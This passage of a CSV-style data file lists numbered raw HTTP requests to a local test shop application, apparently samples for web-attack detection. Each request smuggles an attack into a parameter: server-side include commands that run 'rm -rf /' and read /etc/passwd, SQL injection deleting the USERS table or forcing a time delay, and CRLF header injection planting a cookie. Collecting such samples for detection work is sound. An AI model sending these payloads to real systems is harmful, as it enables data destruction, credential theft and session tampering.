+8689,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+14066,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+10245,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+20483,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+24753,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4508&B1=Pasar+por+cajaany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+5933,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+20867,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+15898,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+1485,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+21482,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasany%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8440,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasany%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+5891,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5035&B1=Pasar+por+cajaany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+5761,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8393,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=%27+DELETE+FROM+USERS&cantidad=50&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+17075,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
